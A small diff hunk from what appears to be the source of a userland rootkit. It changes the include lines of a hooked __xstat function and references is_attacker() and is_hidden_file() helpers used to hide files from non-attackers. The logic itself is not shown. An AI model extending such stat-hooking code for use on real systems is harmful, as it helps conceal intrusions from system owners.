@@ -21,7 +21,8 @@
 #include <sys/stat.h> /* struct stat */
 #include <errno.h> /* errno, ENOENT */
 #include "beurk.h" /* is_attacker(), is_hidden_file() */
-#include "config.h" /* REAL_STAT() */
+#include "config.h" /* REAL___XSTAT() */
+#include "debug.h" /* DEBUG() */
 #include "hooks.h" /* prototype */
 
 int __xstat(int __ver, const char *__filename, struct stat *buf) {
